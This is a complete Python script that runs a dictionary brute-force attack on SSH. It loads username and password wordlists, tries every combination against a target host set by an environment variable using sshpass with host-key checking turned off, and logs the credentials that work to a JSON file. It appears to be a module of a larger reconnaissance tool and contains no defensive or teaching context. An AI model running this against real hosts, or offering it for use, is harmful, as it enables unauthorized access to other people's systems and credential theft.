import os
import json
import subprocess
from pathlib import Path

LIMIT_USERS = 5000
LIMIT_PASSWORDS = 10000

def load(folder):
    out = []
    for file in os.listdir(folder):
        if file.endswith(".txt"):
            with open(os.path.join(folder, file), "r", encoding="utf-8", errors="ignore") as f:
                lines = [l.strip() for l in f if l.strip()]
                out += lines
    return list(set(out))

def test_ssh(host, user, password):
    try:
        cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{host} whoami"
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=8)
        return user in result.stdout.decode()
    except:
        return False

def brute(target, path):
    if not Path("UN").exists() or not Path("PW").exists():
        return
    users = load("UN")[:LIMIT_USERS]
    passwords = load("PW")[:LIMIT_PASSWORDS]
    combos = [(u, p) for u in users for p in passwords]
    total = len(combos)
    results = []
    out = os.path.join(path, "brute_fallback_result.json")
    try:
        for i, (u, p) in enumerate(combos, 1):
            ok = test_ssh(target, u, p)
            results.append({"user": u, "password": p, "success": ok})
            if ok:
                print(f"\n[✓] SSH success: {u}:{p}")
            with open(out, "w") as f:
                json.dump(results, f, indent=2)
            print(f"\rProgress: {i}/{total}", end="", flush=True)
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Saved partial results.")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        with open(out, "w") as f:
            json.dump(results, f, indent=2)

if __name__ == "__main__":
    t = os.getenv("RECON_KI_TARGET")
    p = os.getenv("RECON_KI_RUN_PATH")
    if not t or not p:
        exit(1)
    brute(t, p)
